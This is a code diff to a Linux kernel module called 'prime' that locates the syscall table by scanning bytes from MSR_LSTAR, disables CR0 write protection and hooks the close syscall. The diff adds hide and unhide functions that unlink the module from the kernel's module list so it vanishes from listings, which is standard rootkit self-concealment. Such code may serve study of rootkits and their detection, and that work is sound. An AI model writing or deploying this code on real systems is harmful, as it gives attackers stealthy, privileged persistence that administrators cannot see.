@@ -10,6 +10,8 @@ MODULE_LICENSE("GPL");
 static void **sys_call_table;
 static void **ia32_sys_call_table;
 
+static struct list_head *module_list;
+
 asmlinkage long (*real_close)(struct pt_regs *);
 
 asmlinkage long fake_close(struct pt_regs *regs) {
@@ -22,8 +24,8 @@ static void search_sys_call_table(void) {
   int *do_syscall_64_offset;
   int *sys_call_table_offset;
   int *ia32_sys_call_table_offset;
-  unsigned char *entry_SYSCALL_64 = (unsigned char *)native_read_msr(MSR_LSTAR);
   unsigned char *do_syscall_64;
+  unsigned char *entry_SYSCALL_64 = (unsigned char *)native_read_msr(MSR_LSTAR);
   unsigned char pattern_0[] = {0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0xe8};
   unsigned char pattern_1[] = {0x48, 0x19, 0xc0, 0x48, 0x21, 0xc7, 0x48};
   unsigned char pattern_2[] = {0xd2, 0x21, 0xd0, 0x48, 0x89, 0xef, 0x48};
@@ -101,10 +103,30 @@ static void unhook_syscall(void) {
   write_cr0(read_cr0() | 0x10000);
 }
 
+void hide(void) {
+  if (module_list) {
+    printk(KERN_INFO "prime is already hidden");
+    return;
+  }
+
+  module_list = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
+}
+
+void unhide(void) {
+  if (!module_list) {
+    printk(KERN_INFO "prime is already unhidden");
+    return;
+  }
+
+  list_add(&THIS_MODULE->list, module_list);
+  module_list = NULL;
+} 
+
 int init_module(void) {
   printk(KERN_INFO "prime module started");
   search_sys_call_table();
-  hook_syscall();
+  hook_syscall();  
   return 0;
 }
 
